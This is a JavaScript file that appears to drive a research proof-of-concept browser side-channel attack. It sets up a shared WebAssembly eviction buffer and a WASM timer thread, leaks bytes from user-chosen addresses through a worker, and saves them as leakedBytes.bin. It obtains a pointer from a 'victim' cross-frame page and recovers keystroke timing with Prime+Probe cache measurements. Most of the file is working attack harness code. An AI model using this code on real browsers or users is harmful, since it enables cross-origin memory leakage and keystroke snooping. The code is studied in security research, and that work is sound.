function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const Natives = (function(){
    function isEnabled() {
        try {
            eval("(function(){%GetOptimizationStatus();})");
            return true;
        }
        catch (e){
            return false;
        }
    }

    const enabled = isEnabled();

    function exportNative(name, argumentCount) {
        const args = new Array(argumentCount).fill(0).map((value, index) => `_${index}`).join(", ");
        if (enabled) {
            return eval(`(function(${args}){return %${name}(${args})})`);
        } else {
            return function(){}
        }
    }

    return {
        enabled: enabled,
        isEnabled: isEnabled,

        debugPrint: exportNative("DebugPrint", 1),
    };
})();

function log(msg) {
    Natives.debugPrint(msg);
    console.log(msg);

    const element = document.getElementById("log");

    const scrolledToBottom = element.scrollHeight - element.clientHeight <= element.scrollTop + 10;
    element.append(msg + "\n");
    if (scrolledToBottom) {
        element.scrollTop = element.scrollHeight - element.clientHeight;
    }
}

async function loadModule(path) {
    const response = await fetch(path);
    const buffer = await response.arrayBuffer();
    const module = new WebAssembly.Module(buffer);

    return module;
}

var keystrokes = []

function crossCorrelation(list1, list2) {
    const n = list1.length;
    const m = list2.length;
    const correlation = [];

    // Normalize the length of the result to be (n + m - 1)
    const resultLength = n + m - 1;

    // Loop over each possible shift
    for (let k = 0; k < resultLength; k++) {
        let sum = 0;

        // Iterate over the overlapping part of the lists
        for (let i = 0; i < n; i++) {
            const j = k - i;

            // Ensure we stay within bounds for both lists
            if (j >= 0 && j < m) {
                sum += list1[i] * list2[j];
            }
        }
        correlation.push(sum);
    }

    return correlation;
}

function getMaxIndex(hits){
    let max = 0;
    for(let i = hits.length-1; i >= 0; i--){
        if(hits[i] > max){
            max = hits[i];
            index = i;
        }
    }
    return index;
}

async function startWorker() {
    const BM = 128*1024*1024; // Eviction buffer
    const WP = 64*1024; // A WebAssembly page has a constant size of 64KB
    const SZ = BM/WP; // 128 hardcoded value in wasm

    const memory = new WebAssembly.Memory({initial: SZ, maximum: SZ, shared: true});

    const buffer = new Uint32Array(memory);
    for (let i = 1; i < buffer.length; i++) {
        buffer[i] = buffer[i] + (i * 511);
    }

    const clockModule = await loadModule('js/evsets/clock.wasm');
    const accessModule = await loadModule('js/evsets/poc.wasm');
    await sleep(1000);

    log("[*] Starting worker!");

    let leakedBytes = [];
    const workerThread = new Worker('js/main-worker.js');
    let clockThread = undefined;

    function respond(message, result) {
        workerThread.postMessage({id: message.id, result: result});
    }

    workerThread.onmessage = async function handle(event) {
        let message = event.data;

        switch (message.type) {
            case 'log':
                log(message.message);
                break;

            case 'error':
                // Recoverable errors
                log(`[!] ERROR: ${message.message}`);
                if (clockThread !== undefined) {
                    log(`Stopping timer...`);
                    clockThread.terminate();
                }
                workerThread.terminate();
                startWorker();
                break;

            case 'exception':
                // Unrecoverable errors
                log(`[!] ERROR: ${message.message}`);
                break;

            case 'end': {
                let typedLeakedBytes = new Uint8Array(leakedBytes);
                log(typedLeakedBytes);
                let file = new Blob([typedLeakedBytes], {type: "octet/stream"});
                let a = document.createElement("a");
                let url = URL.createObjectURL(file);

                a.href = url;
                a.download = "leakedBytes.bin";
                document.body.appendChild(a);
                a.click();

                break;
            }

            case 'getAddress': {
                const begin = Number(window.prompt("Enter address to leak from:"));
                const size = Number(window.prompt("Enter number of bytes to leak:"));
                respond(message, {leakBegin: begin, leakSize: size});
                break;
            }

            case 'leakage': {
                log(message.payload);
                leakedBytes = leakedBytes.concat(message.payload);
                respond(message, null);
                break;
            }

            case 'getAccessModule': {
                respond(message, {module: accessModule, memory: memory});
                break;
            }

            case 'stopTimer': {
                log(`Stopping timer...`);
                if (clockThread !== undefined) {clockThread.terminate();}
                clockThread = undefined;
                await sleep(100);
                respond(message, null);
                break;
            }

            case 'startTimer':
                log(`Starting timer...`);
                if (clockThread === undefined) {
                    clockThread = new Worker('js/evsets/wasmWorker.js');
                    clockThread.postMessage({"module": clockModule, "memory": memory});

                    const buffer = new Uint32Array(memory.buffer);
                    const startTick = Atomics.load(buffer, 64);
                    let   endTick = startTick;
                    let   iterations = 0;

                    const timer = setInterval(function(){
                        endTick = Atomics.load(buffer, 64);
                        iterations++;
                        if (startTick !== endTick) {
                            clearInterval(timer);
                            respond(message, null);
                        }
                        if (iterations >= 100) {
                            log('[!] Clock failed to start...');
                            clearInterval(timer);
                        }
                    }, 10);
                }
                break;

            case 'getCrossFrameAddress': {
                const frame = document.getElementById("frame");
                frame.src = "frame.html";
                window.onmessage = function(event) {
                    switch (event.data.type) {
                        case 'log': {
                            log(`[*] Victim: ${event.data.message}`);
                            break;
                        }

                        case 'array_ptr': {
                            respond(message, event.data.address);
                            break;
                        }
                    }
                };
                break;
            }

            case 'graphKeystrokes':{

                /* load data */
                keycode_data = Array.from(message.payload["keycode_data"])
                event_data = Array.from(message.payload["event_data"])
                random_data = Array.from(message.payload["random_data"])
                pp_duration = message.payload["pp_duration"]
                js_duration = message.payload["js_duration"]
                start_time = message.payload["start_time"]


                const scaling_factor = js_duration / pp_duration;
                log(`pp_duration: ${pp_duration}, js_duration ${js_duration}, scaling factor: ${js_duration / pp_duration}`)

                
                
                

                let times = []
                let keycode_hits = []
                let event_hits = []
                for(let i = 0; i < keycode_data.length; i++){
                    if(keycode_data[i] > 100 && event_data[i] > 100){
                        keycode_hits.push(keycode_data[i]);
                        event_hits.push(event_data[i]);
                        times.push(i);
                    }
                }
                
                let KEYCODE_THRESHOLD = harmonic_mean(keycode_hits);
                let EVENT_THRESHOLD = harmonic_mean(event_hits);

                log("keycode threshold: " + KEYCODE_THRESHOLD);
                log("event threshold: " + EVENT_THRESHOLD);
                
                let prev_hit_500 = 0, prev_hit_400 = 0, prev_hit_300 = 0, prev_hit_200 = 0, prev_hit_100 = 0, prev_hit_60 = 0, prev_hit_30 = 0;
                let intervals_500 = [], intervals_400 = [], intervals_300 = [], intervals_200 = [], intervals_100 = [], intervals_60 = [], intervals_30 = [], visible_times=[];
                let times_500 = [], times_400 = [], times_300 = [], times_200 = [], times_100 = [], times_60 = [], times_30 = [] 
                for(let i = 0; i < keycode_hits.length; i++){
                    if(keycode_hits[i] > 100 && event_hits[i] > 100){
                        if(times[i] - prev_hit_500 > 500){
                            if(prev_hit_500 > 0){
                                intervals_500.push(times[i]-prev_hit_500)
                            }
                            visible_times.push(times[i]);
                            times_500.push(times[i]);
                            
                            prev_hit_500 = times[i];
                        }
                        if(times[i] - prev_hit_400 > 400){
                            if(prev_hit_400 > 0){
                                intervals_400.push(times[i]-prev_hit_400)
                            }
                            times_400.push(times[i]);
                            prev_hit_400 = times[i];
                        }
                        if(times[i] - prev_hit_300 > 300){
                            if(prev_hit_300 > 0){
                                intervals_300.push(times[i]-prev_hit_300)
                            }
                            times_300.push(times[i]);
                            prev_hit_300 = times[i];
                        }
                        if(times[i] - prev_hit_200 > 200){
                            if(prev_hit_200 > 0){
                                intervals_200.push(times[i]-prev_hit_200)
                            }
                            times_200.push(times[i]);
                            prev_hit_200 = times[i];
                        }
                        if(times[i] - prev_hit_100 > 100){
                            if(prev_hit_100 > 0){
                                intervals_100.push(times[i]-prev_hit_100)
                            }
                            times_100.push(times[i]);
                            prev_hit_100 = times[i];
                        }
                        if(times[i] - prev_hit_60 > 60){
                            if(prev_hit_60 > 0){
                                intervals_60.push(times[i]-prev_hit_60)
                            }
                            times_60.push(times[i]);
                            prev_hit_60 = times[i];
                        }
                        if(times[i] - prev_hit_30 > 30){
                            if(prev_hit_30 > 0){
                                intervals_30.push(times[i]-prev_hit_30)
                            }
                            times_30.push(times[i]);
                            prev_hit_30 = times[i];
                        }
                    }
                }

                /* ground truth processing */
                keystroke_graph = []
                for(let i = 0; i < keycode_data.length; i++){
                    keystroke_graph.push(0); 
                }
                
                ground_truth_times = []
                let SHIFT = Math.floor((keystrokes[0] - start_time) / scaling_factor) - times_500[0];
                log("shift: " + SHIFT)
                for(let stroke of keystrokes){
                    let index = Math.floor((stroke - start_time) / scaling_factor) - SHIFT;
                    ground_truth_times.push(index);
                    for(let i = 0; i < 10; i++){
                        keystroke_graph[index+i] = 300;
                    }
                }
                
                let key_intervals = getInterval(ground_truth_times);
                lenses = [500, 400, 300, 200, 100, 60, 30, 0]; // lense 0 is actual 
                intervals = [intervals_500, intervals_400, intervals_300, intervals_200, intervals_100, intervals_60, intervals_30, key_intervals];
                times = [times_500, times_400, times_300, times_200, times_100, times_60, times_30, ground_truth_times];

                print_intervals_and_times(intervals, times, lenses); 

                for(let i = 0; i < visible_times.length; i++){
                    for(let j = 0; j < 20; j++){
                        keycode_data[visible_times[i]+j] = keycode_data[visible_times[i]];
                        event_data[visible_times[i]+j] = event_data[visible_times[i]];
                    }
                }
                
                /* 
                filtered_results = []
                filtered_intervals = []
                while(hits.length > 0){
                    let index = getMaxIndex(hits);
                    log("index: " + index + ", time: " + times[index] + ", hits: " + hits[index]);
                    filtered_results.push({"time": times[index], "count": hits[index]});
                    if(times[index] - times[index-1] < 400){
                        hits.splice(index-1, 2);
                        times.splice(index-1, 2);
                    }
                    else{
                        hits.splice(index, 1);
                        times.splice(index, 1);
                    }
                } 
                log(filtered_results)
                filtered_results.sort(function(a,b) {return (a["time"] > b.time) ? 1 : ((b.time > a.time) ? -1 : 0);} );
                
                for(let i = 1; i < filtered_results.length; i++){
                   filtered_intervals.push(filtered_results[i]["time"]-filtered_results[i-1]["time"]); 
                }
                */

                // log("filtered intervals");
                // log(filtered_intervals);
                
                /* append canvas to graph */
                
                createGraph("keycode", keycode_data, keystroke_graph, ["red", "blue"])
                createGraph("event", event_data, keystroke_graph, ["green", "blue"])                                
                createGraph("random", random_data, keystroke_graph, ["brown", "blue"])                

                respond(message, null);
                break;
            }

            default: {
                log("[!] Unhandled message (Main): " + JSON.stringify(message));
                // window.close();
            }
        }
    };
}

function harmonic_mean(data){
    let sum = 0;
    for(let value of data){
        sum += 1/value;
    }
    return data.length / sum;
}

function getInterval(times){
    let interval = []
    for(let i = 1; i < times.length; i++){
        interval.push(times[i] - times[i-1]);
    }
    return interval; 
}

function print_intervals_and_times(intervals, times, lenses){
    for(let i = 0; i < lenses.length; i++){
        log(`lense ${lenses[i]} time and interval`)
        log(times[i])
        log(intervals[i])
    }
}

function createGraph(times1, times2){
    let graph = [] 
    for(let i = 0; i < times2.length; i++){
        let row = [];
        for(let j = 0; j < times1.length; j++){
            row.push(0);
        }
        graph.push(row);
    }

    let index1 = 0, index2 = 0;
    let prev = 0;

    /* setting the first node */
    if(Math.abs(times1[index1] - times2[index2]) < 50){
        prev = (times1[index1] + times2[index2]) / 2;    
        index1++;
        index2++;
    } else if(times1[index1] < times2[index2]){
        prev = times1[index1];
        index1++;
    } else {
        prev = times2[index2];
        index2++;
    }
    return graph;
}

function createGraph(id, observed_data, ground_truth, colors){
    let canvas = document.createElement('canvas')
    canvas.id = id;
    canvas.width = window.innerWidth 
    document.querySelector(".graph").appendChild(canvas)
    const labels = Array.from(observed_data.keys())
    new Chart(id, {
        type: 'bar',
        data: {
            labels: labels, // X-axis (milliseconds)
            datasets: [
                {
                    label: id + 'Counts per Millisecond',
                    data: observed_data, // Y-axis ()
                    backgroundColor: colors[0], // Bar color
                    borderWidth: 1
                }, 
                {
                    label: 'Actual Keystroke', 
                    data: ground_truth,
                    backgroundColor: colors[1],
                    borderWidth: 1
                },
            ]
        },
        options: {
            responsive: true,
            scales: {
                x: { 
                    title: { display: true, text: "Time (ms)" },
                    ticks: { 
                        autoSkip: true, 
                        maxTicksLimit: 5 
                    },
                    grid: {
                        display: false
                    }
                },
                y: { 
                    title: { display: true, text: "Cache Hit Count" },
                    beginAtZero: true,
                    border:{
                        display: false
                    }
                }
            }, 
            title:{
                display: true, 
                text: "Keystroke Recovery with Browser Prime+Probe Slice" 
            }
        }
    });

}

document.onkeypress = function(event){
    let time = Math.floor(performance.now())
    log(time)
    keystrokes.push(time)
}
startWorker();
